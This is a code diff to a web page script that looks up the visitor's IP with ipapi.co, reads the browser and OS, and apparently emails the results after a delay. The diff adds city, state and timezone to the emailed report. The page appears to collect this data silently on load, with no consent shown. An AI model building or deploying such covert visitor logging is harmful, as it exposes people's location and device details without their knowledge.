@@ -5,6 +5,10 @@
     var IP;
     $.getJSON('https://ipapi.co/json/', function(data) {
       IP = data.ip;
+      state = data.region;
+      city = data.city;
+      timezone = data.timezone;
+      console.log(data);
       console.log(IP);
 
       var nAgt = navigator.userAgent;
@@ -161,9 +165,15 @@ Here is the IP's information:
 <br/><br/>
 IP Address: ${IP}
 <br/>
+City: ${city}
+<br/>
+State: ${state}
+<br/>
 OS: ${os}
 <br/>
 Browser: ${browserName}
+<br/>
+Timezone: ${timezone}
 <br/>
 User Time: ${dateTime}`,
             });
@@ -181,5 +191,4 @@ sendEmail();
     }, delayInMilliseconds);
 
   </script>
-
 </html>
